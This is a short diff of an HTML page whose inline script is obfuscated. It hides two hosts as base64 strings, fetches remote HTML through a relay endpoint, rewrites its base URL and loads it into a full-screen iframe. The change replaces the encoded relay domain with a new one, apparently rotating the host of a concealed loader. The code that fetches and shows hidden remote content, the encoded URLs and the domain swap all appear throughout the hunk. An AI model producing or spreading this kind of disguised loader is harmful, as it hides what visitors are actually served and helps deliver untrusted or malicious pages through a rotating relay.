@@ -15,26 +15,26 @@ html,body{margin:0;padding:0;height:100%;overflow:hidden;background:#111;color:#
 <iframe id="x1"></iframe>
 <script>
 (function(){
-    const _0x4f = function(s){return decodeURIComponent(escape(atob(s)))};
-    const A = _0x4f("aHR0cHM6Ly9uZXR3b3JrLW5pbmUtYWxwaGEudmVyY2VsLmFwcA==");
-    const B = _0x4f("aHR0cHM6Ly9jb3JlLWxvZ2ljLXV0aWxzLmdpdGh1Yi5pbw==");
-    const C = A + "/api/relay?url=" + encodeURIComponent(B);
-    fetch(C).then(function(D){
-        if(!D.ok) throw new Error("x");
-        return D.text();
-    }).then(function(E){
-        document.getElementById("x2").style.display="none";
-        let F = E;
-        if(F.indexOf("<head>")!==-1){
-            F = F.replace("<head>","<head><base href=\"" + B + "/\">");
-        } else {
-            F = "<base href=\"" + B + "/\">" + F;
-        }
-        document.getElementById("x1").srcdoc = F;
-    }).catch(function(G){
-        console.log("x",G);
-        document.getElementById("x2").innerText="Failed.";
-    });
+    const _0x4f = function(s){return decodeURIComponent(escape(atob(s)))};
+    const A = _0x4f("aHR0cHM6Ly9sb2dpc3RpY2FsLXV0aWxpdGllcy52ZXJjZWwuYXBw");
+    const B = _0x4f("aHR0cHM6Ly9jb3JlLWxvZ2ljLXV0aWxzLmdpdGh1Yi5pbw==");
+    const C = A + "/api/relay?url=" + encodeURIComponent(B);
+    fetch(C).then(function(D){
+        if(!D.ok) throw new Error("x");
+        return D.text();
+    }).then(function(E){
+        document.getElementById("x2").style.display="none";
+        let F = E;
+        if(F.indexOf("<head>")!==-1){
+            F = F.replace("<head>","<head><base href=\"" + B + "/\">");
+        } else {
+            F = "<base href=\"" + B + "/\">" + F;
+        }
+        document.getElementById("x1").srcdoc = F;
+    }).catch(function(G){
+        console.log("x",G);
+        document.getElementById("x2").innerText="Failed.";
+    });
 })();
 </script>
 </body>
